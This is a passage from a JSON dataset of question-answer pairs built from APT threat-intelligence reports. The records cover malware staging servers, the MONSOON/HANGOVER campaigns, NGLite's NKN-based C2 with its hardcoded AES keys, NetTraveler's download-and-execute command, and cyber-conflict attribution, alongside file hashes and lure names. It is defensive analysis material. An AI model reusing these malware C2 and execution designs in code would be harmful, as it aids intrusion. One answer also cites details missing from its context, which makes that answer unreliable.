\tlocation of a\t file analyzed by VT\ton\t9-30-2015 was found on the staging/storage server and is still present\t at\t the time of this writing.\nFigure 6: Malware archive contains six APT-level threats\nThis\t URL is hosted in an open directory where several other malware samples have been stored in the form of RAR\t files, and reveals a\t grouping of malware utilized in this and perhaps other campaigns. This site has been reported to the Myanmar CERT for incident\t response. New content\t has been added to the site as of Dec 10, 2015 (not\t reflected in the image to the left).\nThe \"Last\t modified\" field suggests that\t this webserver has been used as a\t file staging location since at\t least\t April 10 of 2015. The first\t indicators of passive DNS activity on this domain name were observed on April 10 at\t 03:20:28. While further research is required to gain a\t better understanding of the distribution system at\t play, analysis of these files can provide insight\t into the threat\t campaign(s) at\t hand.\nThe relevant\t file hashes, datestamps, and other data about\t the RAR\t files follows. An indented bullet\t means\nthat\t the prior bullet\t was an archive or installer file that\t contained the indented files. For example, in the first\t sample, Patch-update0409BAN.rar contained Setup.exe, SqmApi.dll, and plgus_res.dll. The file plgus_res.dll is an installer file that\t contains the five innermost\t files listed (starting with mcf.ep and ending with res.db). This format\t shall be used throughout\t the document. Files shall be discussed in date order, in order to get\t a\t sense of threat\t actor timelines and capabilities.\nQuestion: How did the discovery of the Trochilus RAT and its associated files (data.dat and shell.dll) contribute to the understanding of the threat actor's capabilities and tactics?",
    "output": "Answer: The discovery of the Trochilus RAT and its associated files contributed significantly to the understanding of the threat actor's capabilities and tactics. The Trochilus RAT demonstrated advanced capabilities, including encryption and the use of helper applications like Servant Shell. The presence of these files indicated that the threat actors had sophisticated methods for maintaining persistence and evading detection. The use of a YARA rule to identify additional samples of Servant Shell revealed that the malware was rare but had been found in the wild, suggesting a targeted and potentially long-running campaign. This information helps in profiling the threat actor's technical expertise and the extent of their operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: INFRASTRUCTURE\nBy integrating the findings with prior research [1] [8], it was possible to connect MONSOON directly with infrastructure used by the HANGOVER group via a series of strong connections. The original HANGOVER infrastructure overlaps with unique passive DNS records and is further linked by the use of a specific SOA RNAME record.\nAn example of this connection is illustrated below.\nBoth of the IPs that link this infrastructure appear to be unique to the Hangover group. The newsnstat[.com] domain was used earlier in 2015 for previous HANGOVER campaigns, and was then repurposed in December 2015 for the MONSOON campaign.\nMedium Headline: WEAPONISED DOCUMENT HASHES (SHA1)\n9034c8bfac8385a29f979b1601896c6edb0113b2 (Cyber_Crime_bill.doc)\n11064dcef86ac1d94c170b24215854efb8aad542 (Cyber_Crime_bill.doc)\n5de78801847fe63ce66cf23f3ff3d25a28e2c6fe (China_Vietnam_Military_Clash.doc)\n478a41f254bb7b85e8ae5ac53757fc220e3ab91c (Cyber_Crime_bill.doc)\n1e39ff194c72c74c893b7fd9f9d0e7205c5da115 (china_report_EN_web_2016_A01.doc)\nf7d9e0c7714578eb29716c1d2f49ef0defbf112a (Job_offers.doc)\n406c74e8eb89fa7b712a535dd38c79c1afd0c6fe (DPP_INDIA_2016.pps)\n9cdbb41f83854ea4827c83ad9809ed0210566fbc (DPP_INDIA_2016.doc)\n7ee94c8279ee4282041a242985922dedd9b184b4 (maritime_dispute.pps)\n1ce0ad3556f5866f309e04084d9a230f9f2ce158 (Clingendael_Report_South_China_Sea.pps)\n4a575bfe63262d53a765de254f534e830d03f638\n(PLA_Forthcoming_Revolution_in_Doctrinal_Affairs.pps)\ncfb33642b702bb4da43aa6842aa657f1ec89b1f6 (China_Security_Report_2016.pps) 5d61d614731beeb520f767fcbb5afe151341238a (militarizationofsouthchinasea_1.pps)\nf3c9c62869c87fe177a69271b9e7f2b5aabcd66c (Chinese_Influence_Faces_2.pps)\ndcccd7a9886e147ecf01718047e1f911323ca8c9 (2016_China_Military_PowerReport.pps)\nc9dddd6d4858234e1be971c7f66193ea907ac8d8 (PLA_UAV_DEPLOYMENT.pps)\n11c05a5f6ca2e683dba31d458777c0b6b8d558aa\n(7GeopoliticalConsequencetoAnticipateinAsiainEarly2016_1.doc)\n3eef8e44556e4102a71ea4499d30f57495b9096a (UN__4_21_2015.doc)\n4d1ad73a9c61527a8b685006ab60b0a3ffbc51bd\n(China_plan_to_dominate_South_China_Sea_and_beyond.doc)\ne6acbb5f653c5dc8eb324e82591587179b700d0c\n(China_Response_NKorea_Nuclear_Test13.pps)\nea3029aef9ab1cda24ccecfbed8f31ec1f28525e (ChinaUS_11.pps)\n3f9dc2944269d1160048c5a96e5eec8d14449341\n(China_two_child_policy_will_underwhelm11.pps)\n971ea3f1d32bb8bd9657c17b2c1520b5fb9c1d0e (MilReforms_1.pps)\ne8276f46e335c4f8cd7313da1fd0b7f6ac9d5892 (MilReforms_2.pps)\n1c9d01d8562509a7f10e355e6d1d9f3d76cd44cd (CHINA_FEAR_US_3.pps) 48c9f91e6829f2dee0a4a2bf5cb1f26daea6c46a (CHINAS_PUZZLING_DEFENSE_AGREEMENT_WITH_AUSTRALIA_12.pps) 414e7d0d874cfd42bd4a11a317730e64bc06b794 (Obama_Gift_China_11.pps) 74c504886a7166c044f3fe3529745cdcf097a726 (japan_pivot_12.pps) 4d0ed3d1c6a3b4dfe3f5a3a8cf2bb2120b617d18 (TaiwanDiplomaticAccess_11.pps) a4f0494212314c9e8c32dd6cfb16030b13965c2c (australia_fonops_13.pps) e27d3cfc9141f618c5a8c075e7d18af11a012710 (Sino_Pak.pps) 824013c9d8b2aab1396c4a50579f8bd4bf80abdb (prc_nsg.pps) a5cf24751acdf4b9ab307d3fda037c164758704c (Jakobson_US_China_Report.pps) 4d1ad73a9c61527a8b685006ab60b0a3ffbc51bd (Sino_Russia.doc)\nMedium Headline: NAMES OF LURE & WEAPONISED FILES\nBelow are the most common filenames used as lures. The distribution of words was used to generate the word cloud.\n10_gay_celebs\n11_Nepalies_Facts\n13_Five_Year_Plan_2016-20-1\n2016_china_military_powerreport\n7GeopoliticalConsequencetoAnticipateinAsiainEarly2016\nABiggerBolderChinain2016\nAeropower\naerospace\nAliexpress_Randomiser\nAN_UPDATED_U\narty_main\nAssessing_PLA_Organisational_Reforms\naustralia_fonops\nbank\nBehind_China's_Gambit_in_Pakistan\nBeijing_Nanshan_Ski_Village\nBOC\nbook_china_transition_under_xi_jinping\nCEF_Chengdu_July_2016\nCHINA_FEAR_US\nchinamilreforms\nchinamilstrength\nChina_Nuclear_Weapons\nChina_Pakistan_\nChina_Pak_Policy\nChina_plan_to_dominate_South_China_Sea_and_beyond\nChina_Response_NKorea_Nuclear_Test1\nchinascyberarmy2015\nchina_security_report2016\nChinas_Evolving_Approach_to_Integrated_Strategic_Deterrence\nChinasMilitaryIntelligenceSystemisChanging\nChinas_New_Silk_Road_and_US_Japan_Alliance_Geostrategy\nchina_sperm_study\nCHINA'S_PUZZLING_DEFENSE_AGREEMENT_WITH_AUSTRALIA\nChina_two_child_policy_will_underwhelm\nChinaUS\nChina_Vietnam_Mil_clash\nchina_vietnam_military_clash\nChinese_defence_Budget\nChinese_Influence\nChinese_Influence_Faces\nchinesemilstrat\nChristians_in_China_suffer_persecution_2015\nCIDEX2016\nclingendael_Report_South_China_Sea\ncn-lshc-hospital-operations-excellence\nconfig\nCounter_Strike4\nCPM_Update_South_China_Sea\ncppcc\nCSR74_Blackwill_Campbell_Xi_Jinping\nDefexpo_ebroucher\ndpp_india_2016\nelection\nenggmarvels\nEx_Documents12\nexercise_force_18\nExercise_Force_18_21\nEXERCISE_FORCE_281\nFrom_Frontier_To_Frontline_Tanmen_Maritime_Militia\nfuturedrones\ngaokaonewreforms\ngaokaonewschedule\nGoedecke_IPSP_South_china_sea\nharbin\nSR57_US_China_Apr2016\nSR57_US_China_April16\nstewardess2\nStrategic_Standoff\nsyria_china\nTaiwan\nTaiwanDiplomaticAccess\nTax\nTaxupdate\nthe_chinese_military_overview_and_issues\nthe_chinese_statecraft\nThe_PLA_Cultivates_Xuexing_for_the_Wars_of_the_Future The_US_FON_Program_in_the_South_china_Sea\ntibetculture\nTk_main\nTop_Five_AF\ntraffic\nUruguayJan-Jun\nUruguayJul-Dec\nUS_china\nUS_China_Cyberwar\nus_srilanka_relations\nWhy_Does_China_Want_to_Control_the_South_China_Sea\nWILL_ISIS_INFECT_BANGLADESH\nY-20zodiac\n\nHow did the MONSOON campaign leverage its infrastructure, and what unique identifiers connected it to the HANGOVER group?",
    "output": "The MONSOON campaign leveraged its infrastructure by integrating findings with prior research, which allowed it to be directly connected to the infrastructure used by the HANGOVER group. This connection was established through a series of strong links, including unique passive DNS records and the use of a specific SOA RNAME record. An example of this connection is the repurposing of the 'newsnstat[.com]' domain, which was initially used in 2015 for HANGOVER campaigns and later reused in December 2015 for the MONSOON campaign. Additionally, the IPs linking this infrastructure appeared to be unique to the HANGOVER group.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Custom NGLite\nThe NKN touts that their decentralized network uses a public blockchain and can support communication between millions of peers, each of which are identified by a unique NKN address instead of the typical network identifiers, such as IP addresses. Therefore, the immediate IP address that the NGLite tool communicates with in its C2 channel is just a peer in the decentralized network and is unlikely to represent the threat actor's network location. This design makes detection and prevention of the NGLite C2 communication channel difficult.\nFortunately, the use of NKN as a C2 channel is very uncommon. We have seen only 13 samples communicating with NKN altogether \u2013 nine NGLite samples and four related to an open-source utility called (<https://github.com/rule110-io/surge>)Surge that uses NKN for file sharing. Eight of the nine known NGLite samples were scanned by VirusTotal. Four were undetected, three were detected by one antivirus and the remaining sample was detected by five. This low detection rate suggests that NGLite had very little antivirus coverage during this attack campaign.\nAs mentioned in the previous section, the dropper creates registry keys and executes a custom variant of the NGLite backdoor (SHA256: 805b92787ca7833eef5e61e2df1310e4b6544955e812e60b5f834f904623fd9f) saved at the following path:\nC:\\Windows\\system32\\ME_ADAudit.exe\nThe data structures within the Go-based backdoor contain the following path, which is used to store the main source code for this custom variant of NGLite on the developers' system:\n/mnt/hgfs/CrossC2-2.2/src/ng.com/lprey/main.go\nBased on this path, one might surmise that the actor used  to build a cross platform Cobalt Strike C2 payload; however, we have no reason to believe that this payload is actually based on CrossC2, as the payload is a customized version of the publicly available NGLite backdoor.\nIt is possible that the threat actors included the CrossC2 string in the path as a misdirection, hoping to confuse threat analysts into thinking they are delivering a Cobalt Strike payload. We have seen the following NGLite samples using this same source code path dating back to Aug. 11, which suggests that this threat actor has been using this tool for several months:\n3da8d1bfb8192f43cf5d9247035aa4445381d2d26bed981662e3db34824c71fd 5b8c307c424e777972c0fa1322844d4d04e9eb200fe9532644888c4b6386d755 3f868ac52916ebb6f6186ac20b20903f63bc8e9c460e2418f2b032a207d8f21d\nThe custom NGLite sample used in this campaign checks the command line arguments for g or group value. If this switch is not present, the payload will use the default string 7aa7ad1bfa9da581a7a04489896279517eef9357b81e406e3aee1a66101fe824 in what NGLite refers to as its seed identifier.\nThe payload will create what it refers to as a prey id, which is generated by concatenating the MAC address of the system network interface card (NIC) and IPv4 address, with a hyphen (-) separating the two. This prey identifier will be used in the C2 communications.\nThe NGLite payload will use the NKN decentralized network for C2 communications. See the NKN client configuration in the sample below:\nThe sample first starts by reaching out to seed.nkn[.]org over TCP/30003, specifically with an HTTP POST request that is structured as follows:\nIt also will send HTTP POST requests with monitor_03 as the prey id, as seen in the following:\nThe seed.nkn[.]org server responds to this request with the [prey id (MAC-IPv4)] within the JSON structured as follows:\n{\"id\":\"nkn-sdk-go\",\"jsonrpc\":\"2.0\",\"result\": {\"addr\":\"66.115.12.89:30002\",\"id\":\"223b4f7f4588af02badaa6a83e402b33dea0ba8908e4cd6008f84c2b98a6a7de\",\"pubkey\":\"38ce48a2a3cffded7c\nThis suggests the payload will communicate with the peer at 66.115.12.89 over TCP/30003. The seed.nkn[.]org server then responds to the monitor_03 request with the following, which suggests the payload will communicate with 54.204.73.156 over TCP/30003:\n{\"id\":\"nkn-sdk-go\",\"jsonrpc\":\"2.0\",\"result\": {\"addr\":\"54.204.73.156:30002\",\"id\":\"517cb8112456e5d378b0de076e85e80afee3c483d18c30187730d15f18392ef9\",\"pubkey\":\"99bb5d3b9b609a31c\nAfter obtaining the response from seed.nkn[.]org, the payload will issue an HTTP GET request to the IP address and TCP port provided in the addr field within the JSON. These HTTP requests will appear as follows, but keep in mind that these systems are not actor-controlled; rather, they are just the first peer in a chain of peers that will eventually return the actor's content:\nEventually, the network communications between the custom NGLite client and server are encrypted using AES with the following key: WHATswrongwithUu\nThe custom NGLite sample will start by sending the C2 an initial beacon that contains the result of the whoami command with the string #windows concatenated, as seen in the following:\n[username]#windows\nAfter sending the initial beacon, the NGLite sample will run a sub-function called Preylistener that creates a server that listens for inbound requests. The sample will also listen for inbound communications and will attempt to decrypt them using a default AES key of 1234567890987654. It will run the decrypted contents as a command via the Go method os/exec.Command. The results are then encrypted using the same AES key and sent back to the requester.\nRead the text above and answer this question: What are the key characteristics of the custom NGLite sample used in this campaign, and how does it establish its C2 communications?",
    "output": "The custom NGLite sample used in this campaign checks for a 'g' or 'group' command line argument. If this argument is not present, the payload uses a default string as its seed identifier. It generates a 'prey id' by concatenating the MAC address of the system's network interface card (NIC) and IPv4 address, separated by a hyphen. This identifier is used in the C2 communications. The payload initiates communication by sending an HTTP POST request to seed.nkn[.]org over TCP/30003, which responds with peer information. The payload then issues HTTP GET requests to the provided IP addresses and ports, which are part of the NKN decentralized network. The communications are encrypted using AES with the key 'WHATswrongwithUu'. After sending an initial beacon containing the result of the 'whoami' command concatenated with '#windows', the sample runs a sub-function called Preylistener to listen for inbound requests, decrypting and executing them using a default AES key of '1234567890987654'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 1039: Download and run new module.\nthe module uses Paramb as an integer value indicating a length of a string to read next from the server response. the received string will be used as a newFilename. then it reads another dWord value from the server response and interprets it as a size of the following data to read. After that a new directory \"internet explorer\" is created in the directory of the current running module. then the module creates a new file using the value newFilename pushed by the server. the module makes 2 attempts to start a new process: by calling createProcessA system APi and shellexecuteA if the previous call failed. the code was designed to support more commands (1028, 1029, 1032, 1033, 1034, 1035, 1036), however they are now falling into command 1029 handler and then ignored. We created a chart showing a tree of commands dependencies:\nthe execution of this command processing thread continues in a loop until it is interrupted by shutdown command coming from the server. the code starts new loop iteration after hardcoded value of 30 seconds.\n\nHow does the NetTraveler malware handle the execution of command 1039 to download and run a new module? Explain the sequence of operations and the purpose of each step.",
    "output": "The NetTraveler malware handles the execution of command 1039 through a series of steps designed to download and run a new module. First, it uses an integer value (Paramb) to determine the length of a string to read from the server response, which is then used as a new filename. Next, it reads another DWORD value from the server response to interpret the size of the following data to read. The malware then creates a new directory named 'internet explorer' in the directory where the current module is running. It proceeds to create a new file using the new filename provided by the server. The module attempts to start a new process by first calling the CreateProcessA system API, and if that fails, it tries ShellExecuteA. The code is designed to support additional commands (1028, 1029, 1032, 1033, 1034, 1035, 1036), but these currently fall under the command 1029 handler and are ignored. The execution of this command processing thread continues in a loop until interrupted by a shutdown command from the server, with each loop iteration starting after a hardcoded delay of 30 seconds.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 3 Incentives for the State to Use Capabilities in Private Hands\nA general political incentive for states to use proxies is summed up by the concept of 'plausible deniability'. Developed in the context of maritime privateering, it was:\nPolitical incentive for states to use proxies is summed up by the concept of 'plausible deniability'.\n'invented [by state rulers] at the turn of the seventeenth century. If a 'private' undertaking that a ruler authorised met with success, s/he could claim a share in the profits. If the enterprise caused conflict with another state, the ruler could claim it was a private operation for which s/he could not be held responsible'.9\nWhile some of the specific elements of maritime privateering are no longer relevant today, the general concept and logic for this type of behaviour still apply and exist today. For example, the Russian Government denied any involvement in the Ukrainian crisis for many months, in spite of eyewitness accounts and news reports plainly stating otherwise. One particularly horrible example of plausible deniability was the mass murder of the passengers on Malaysia Airlines flight 17.\nThe benefits of plausible deniability also apply to the Ukrainian Government. The Ukrainian Cyber Forces, led by Eugene Dokukin, is a volunteer group that\noccasionally publishes data from the Russian Ministry of the Interior, and at one point threatened to shut down the internet in the Crimea and other cities in eastern Ukraine.10 There is no evidence suggesting that the Ukrainian Government coordinates or directly supports any of the Ukrainian Cyber Forces' activities, and my own research supports this conclusion. At the same time, the Government benefits from its activities with or without its involvement. For the Ukrainian Government, another set of incentives is arguably more important than the political ones: its own limited capabilities, and the possibility to rely on proxy actors to augment these capabilities in the face of a much more powerful opponent.\n5 'Feb. 28 Updates on the Crisis in Ukraine,' The New York Times News Blog, February 28, 2014, (<http://thelede.blogs.nytimes.com/2014/02/28/latest-updates-tensions-in-ukraine/?_r=0>)http://thelede.blogs.nytimes. (<http://thelede.blogs.nytimes.com/2014/02/28/latest-updates-tensions-in-ukraine/?_r=0>)com/2014/02/28/latest-updates-tensions-in-ukraine/?_r=0.\n6 'Kremlin website hit by 'powerful' cyber attack,' Reuters, March 14, 2014, (<http://www.reuters.com/article/2014/03/14/us-russia-kremlin-cybercrime-idUSBREA2D16T20140314>)http://www.reuters.com/article/2014/03/14/us-rus-(<http://www.reuters.com/article/2014/03/14/us-russia-kremlin-cybercrime-idUSBREA2D16T20140314>)sia-kremlin-cybercrime-idUSBREA2D16T20140314.\n7 'Cyber-attack' cripples Ukraine's electronic election system ahead of presidential vote,' RT, 24 May, 2014, (<http://www.rt.com/news/161332-ukraine-president-election-virus/>)http://www.rt.com/ (<http://www.rt.com/news/161332-ukraine-president-election-virus/>)news/161332-ukraine-president-election-virus/.\n8 'Ukraine election narrowly avoided 'wanton destruction' from hackers (+video),' The Christian Science Monitor, June 17, 2015, (<http://www.csmonitor.com/World/Passcode/2014/0617/Ukraine-election-narrowly-avoided-wanton-destruction-from-hackers-video>)http://www.csmonitor.com/World/Passcode/2014/0617/Ukraine-election-narrowly-avoided-wanton-destruction-from-hack-(<http://www.csmonitor.com/World/Passcode/2014/0617/Ukraine-election-narrowly-avoided-wanton-destruction-from-hackers-video>)ers-video.\n9 Janice Thomson. Mercenaries, Pirates, and Sovereigns (Princeton, NJ: Princeton University Press, 1994), 21.\nThe Russian Government is considered to be among the most sophisticated actors with significant in-house cyber capabilities,11 and the government in Ukraine faced a dire situation at the beginning of the conflict. Its military had essentially been falling apart since the end of the Soviet Union and Kyiv was ill-prepared for a conflict with Russia. As Dmitry Gorenburg points out:\n'At the time of its creation, the Ukrainian military was considered the fourth most powerful conventional military force in the world, behind only the United States, Russia, and China. However, these forces were allowed to atrophy throughout the post-Soviet period, with virtually no funding provided for the maintenance of equipment or troop training. Reforms were not carried out and there were no attempts at rearmament to replace aging Soviet equipment'.12\nThe responses from several interviewees confirmed this assessment.\nQ: How does the concept of 'plausible deniability' apply in the context of modern cyber warfare, and what historical precedents inform this strategy?",
    "output": "The concept of 'plausible deniability' in modern cyber warfare is rooted in historical practices such as maritime privateering. Originating in the seventeenth century, this strategy allowed rulers to authorize private operations and claim a share of the profits if successful, while denying responsibility if the actions caused conflict. In contemporary times, this concept is applied to cyber operations where states can deny involvement in cyber attacks conducted by private actors. For example, the Russian Government denied involvement in the Ukrainian crisis despite evidence to the contrary, including the tragic incident involving Malaysia Airlines flight 17. Similarly, the Ukrainian Government benefits from the activities of the Ukrainian Cyber Forces without direct involvement, leveraging the group's capabilities against a more powerful adversary.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Appendix: Parallel and Previous Research\nThe MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor, Securelist, Feb 2013\nMiniduke is back: Nemesis Gemina and the Botgen Studio, Securelist, July 2014\nMiniDuke 2 (CosmicDuke), CrySyS, July 2014\nCOSMICDUKE Cosmu with a twist of MiniDuke [pdf], F-Secure, September 2014\nTHE CASE OF THE MODIFIED BINARIES, Leviathan Security, October 2014\nA word on CosmicDuke, Blaze's Security Blog, September 2014\nOnionDuke: APT Attacks Via the Tor Network, F-Secure, November 2014\nThe Connections Between MiniDuke, CosmicDuke and OnionDuke, F-Secure, January 2015\n\nHow does the research on MiniDuke, CosmicDuke, and OnionDuke contribute to the understanding of the CozyDuke APT? Explain the significance of these connections in terms of malware evolution and threat actor tactics.",
    "output": "A: The research on MiniDuke, CosmicDuke, and OnionDuke provides valuable insights into the evolution and tactics of the CozyDuke APT. Specifically, the reports highlight strong structural and functional similarities between CozyDuke's toolset and earlier MiniDuke second-stage components, as well as more recent CosmicDuke and OnionDuke components. This indicates a shared lineage and potential collaboration or common development among these threat actors. Understanding these connections helps cybersecurity experts recognize patterns in malware development, anticipate future threats, and improve detection and mitigation strategies. For instance, recognizing the use of phony digital certificates and sophisticated anti-detection techniques employed by these related APTs can enhance the ability to identify and counteract similar attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Overview\nThe recent expansive intrusion campaign of over half a dozen government agencies and as-yet unknown other organizations through malicious backdoors in the SolarWinds Orion platform is already one of the most significant acts of cyber espionage in history. This intrusion, dubbed SUNBURST/Solorigate, appears intended for information theft and espionage rather than destruction, placing this campaign within the realm of counterintelligence, not just incident response. Analyzing this incident within the realm of counterintelligence may fill the gap of descriptive language for this incident rather than bipolar descriptions of \"sophisticated\" or in-depth analysis which may add to confusion for network defenders. Additionally, only a handful of companies have direct access and the investigative resources to gain meaningful insights into the technical components of the backdoor. The actor is a different story.\nLike most complex, public intrusions, attribution has been messy. FireEye has named the and Volexity dubbed the threat actor \",\" stating that the actor is the same as UNC2452, though FireEye has not substantiated that claim. Adding further complexity, Washington Post correspondent Ellen Nakashima unnamed government sources claiming Russian actors, in particular APT29, are responsible for the attack. Members of the U.S. Congress have also Russia, and in particular the Russian Foreign Intelligence Service (SVR), as the responsible party, and added calls for response. Microsoft President Brad Smith for strong action. While we expect these organizations have far more insight into the nature of the breach, as well as classified sources of intelligence information, calls for strong response should include publicly disclosed information to support accusations.\nPublic evidence for these claims is currently scant. Some, including Jake Williams, who runs Rendition Security and teaches for the SANS Institute, has said that technical evidence is forthcoming, but cannot be disclosed without tipping off the adversaries to missteps and giving them a means to cover their tracks. Still, the lack of public evidence gives rise to claims that other actors, even perhaps other countries, may be responsible,  as well.\nIntelligence analysis, properly conducted, combats bias. Bias can lead to missteps in policy. Engaging in policy discussions about proportional responses (or, at times, very disproportionate response) without strong evidence is potentially dangerous. As rumors of attribution to Russia circulate, attribution prior to evidence is premature and myopic, biasing the analyst to only certain behaviors and actors. Further, intelligence analysis provides both strategic and tactical guidance for responses. At the strategic level, we can be assured that responses are coordinated and proportional. At the tactical level, defenders can apply intelligence to seed proactive activities, such as hunting for behaviors after indicators run dry.\nAmong information security researchers, has occurred regarding the possibility alternate actors, such as APT41, may ultimately be found responsible. APT41, also known as Winnti and Barium, has , and previously conducted attacks which beg comparison with the SUNBURST/Solorigate attack. (Note: Recorded Future has synonymized several named groups, including APT41, Axiom Hacking Group, Barium, Blackfly, Dogfish, Ragebeast, Wicked Panda, Winnti Group, as Winnti Umbrella Group.) In March 2017, by breaching the company which made CCleaner, a system cleaner software. Researchers from Cisco Talos and Morphisec uncovered the campaign, which ultimately spread to 2.27 million computers. While these comparisons fall well short of the requirements for attribution, APT41 does merit consideration as a candidate actor group responsible for the SUNBURST/ Solorigate breach. Enter threat intelligence.\n\nWhy is it crucial to engage in intelligence analysis before making policy decisions about proportional responses to cyber attacks, and how does this process combat bias?",
    "output": "Engaging in intelligence analysis before making policy decisions about proportional responses to cyber attacks is crucial because it ensures that responses are coordinated and proportional. Intelligence analysis combats bias by providing a structured approach to evaluating evidence and considering multiple hypotheses. This process helps to avoid premature and myopic attributions, which can lead to missteps in policy. By conducting thorough intelligence analysis, policymakers can make informed decisions based on strong evidence, reducing the risk of dangerous or disproportionate responses. Additionally, intelligence analysis provides both strategic and tactical guidance for responses, allowing defenders to apply intelligence to seed proactive activities, such as hunting for behaviors after indicators run dry.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: 3 Observations from Ukraine: Hints of State-sponsored Operations\nThe attribution of cyber attacks is notoriously difficult. In order to discover state-sponsored operations, one can only speculate based upon inconclusive indicators such as target, malware, motive, and complexity.\nIn Ukraine, some advanced cyber espionage tools such as Turla/Snake/Ouro-bours and Sandworm have not only been linked to the conflict, but also associated with an 'Advanced Persistent Threat' (APT) actor (i.e. nation-state), likely Russia.23 At the same time, analysts have argued that most of the cyber attack methods in Ukraine such as DDoS attacks and defacements have been technically unsophisticated. Thus, on balance, the 'complexity criterion' appears unmet.\n20 Painter. Testimony of Christopher M. E. Painter, Coordinator for Cyber Issues, U.S. Department of State Before the Senate Foreign Relations Committee Subcommittee on East Asia, the Pacific, and International Cybersecurity Policy Hearing Titled: 'Cybersecu-rity: Setting the Rules for Responsible Global Behaviour.'\n21 For example, drawing parallels with state obligations during crises on the sea, a duty to assist victims of severe cyberattacks (an e-SOS) has been proposed by Duncan B. Hollis in 'An E-SOS for Cyberspace,' Harvard International Law Journal 52, no. 2 (2011), http://papers.ssrn.com/sol3/papers.cfm?abstract_id=1670330.\n22 Angela McKay et al., 'International Cybersecurity Norms. Reducing Conflict in an Internet-Dependent World' (Microsoft, 2015), http://download.microsoft.com/download/7/6/0/7605D861-C57A-4E23-B823-568CFC36FD44/International_Cybersecurity_%20Norms.pdf.\n23 See, for example, 'Suspected Russian Spyware Turla Targets Europe, United States,' Reuters, March 7, 2014, http://www.reuters. com/article/2014/03/07/us-russia-cyberespionage-insight-idUSBREA260YI20140307; 'Zero Day Vulnerability CVE-2014-4114 Used in Cyber-Espionage,' iSIGHT Partners, October 21, 2014, http://www.isightpartners.com/2014/10/cve-2014-4114/.\nActions attributed to hacktivist groups raise questions regarding possible coordination with state entities.\nActions attributed to hacktivist groups also raise questions regarding possible coordination with state entities. For example, Ukrainian officials reported that, even when the hacktivist group CyberBerkut failed to compromise Ukraine's online election system and only managed to present fake election results on the election's website for a very brief period, a Russian state-owned TV channel still displayed these results immediately.24 In another incident, CyberBerkut allegedly leaked the recording of a phone call between Estonian Minster of Foreign Affairs Urmas Paet and European Union (EU) High Representative for Foreign Affairs and Security Policy Catherine Ashton, suggesting that Cyber Berkut either possesses sophisticated cyber capabilities or has links to Russian intelligence services.25\nHere, we must remember SCO's focus on 'information security', as opposed to 'cyber security', and in fact many analysts believe that both Russia26 and Ukraine27 are conducting information operations within the context of the ongoing conflict in eastern Ukraine. The internet is a natural terrain for these operations;28 the reported 'troll factories' in St. Petersburg creating pro-Russian comments for online new media serve as prominent examples.29\nSmall Headline: 4 Which Norms of Behaviour Were Followed?\nThus, there are two dominant ongoing conversations relative to the creation of political cyber norms: (1) the information security norms proposed by the SCO, and (2) the voluntary norms of behaviour in peacetime (initially promoted by the US). This section will analyse the known cyber incidents in Ukraine in the context of these two normative frameworks.\n24 Mark Clayton. 'Ukraine Election Narrowly Avoided 'Wanton Destruction' from Hackers,' Christian Science Monitor, June 17, 2014, http://www.csmonitor.com/World/Passcode/2014/0617/Ukraine-election-narrowly-avoided-wanton-destruction-from-hackers-video.\n25 Ewen MacAskill. 'Ukraine Crisis: Bugged Call Reveals Conspiracy Theory about Kiev Snipers,' The Guardian, March 5, 2014, http://www.theguardian.com/world/2014/mar/05/ukraine-bugged-call-catherine-ashton-urmas-paet; Trend Micro, 'Hacktivist Group CyberBerkut Behind Attacks on German Official Websites,' Security Intelligence Blog, http://blog.trendmicro.com/ trendlabs-security-intelligence/hacktivist-group-cyberberkut-behind-attacks-on-german-official-websites/.\n26 NATO StratCom Centre of Excellence, Analysis of Russia's Information Campaign Against Ukraine, October 15, 2014, http:// www.stratcomcoe.org/download/file/fid/1910.\n27 Maksim Vikhrov. 'Ukraine Forms 'Ministry of Truth' to Regulate the Media,' The Guardian, December 19, 2014, http://www. theguardian.com/world/2014/dec/19/-sp-ukraine-new-ministry-truth-undermines-battle-for-democracy.\n28 Maeve Shearlaw. 'From Britain to Beijing: How Governments Manipulate the Internet,' The Guardian, April 2, 2015, http:// www.theguardian.com/world/2015/apr/02/russia-troll-factory-kremlin-cyber-army-comparisons.\n29 Dmitry Volchek and Daisy Sindelar. 'One Professional Russian Troll Tells All,' RadioFreeEurope/RadioLiberty, March 25, 2015, sec. Russia, http://www.rferl.org/content/how-to-guide-russian-trolling-trolls/26919999.html; Shearlaw. 'From Britain to Beijing.'\nVery Small Headline: 4.1 The Information Security Norms Proposed by the SCO\nIn general, the state-sponsored conventional military operations in Ukraine are not in accordance with international norms;30 therefore, it should come as no surprise that the reported cyber incidents also appear unorthodox. However, one important question, given that Russia is directly involved in the Ukraine conflict, is how these cyber incidents fit into the Code of Conduct framework whose primary focus is information sovereignty. In that regard, alleged Russian cyber operations would appear inconsistent with the norms it has hitherto proposed or supported. In fact, most of the cyber incidents reported by both sides in the conflict seem to fall into the category of information operations, which could be interpreted as violating another state's information sovereignty. In the words of the Code of Conduct, ICTs were likely used in an effort to interfere 'in the internal affairs of other States [\u2026] with the aim of undermining their political, economic and social stability'.\nAlleged Russian cyber operations appear inconsistent with the norms it has hitherto proposed.\nSince the norms supported by SCO and Russia focus on 'information' rather than strictly 'cyber' security, one can see that the non-cyber information operations via other media such as TV are also inconsistent with the stated principle of information sovereignty. The Code of Conduct also prohibits the abuse of a 'dominant position' in cyberspace; in this regard too, Russia may have violated its own principles by abusing its control over Russian-owned social media networks such as Vkontakte and Odnoklassniki which are also popular among Ukrainian users.31\nAnalysing the application of the SCO-proposed information security norms reveals an inherent weakness: quantifying the influence of highly subjective information content or identifying a breach of 'information sovereignty' is problematic, if not impossible.\n\nQuestion: What role do hacktivist groups play in the cyber conflict in Ukraine, and how might their actions suggest coordination with state entities? Provide specific examples.\n\nAnswer:",
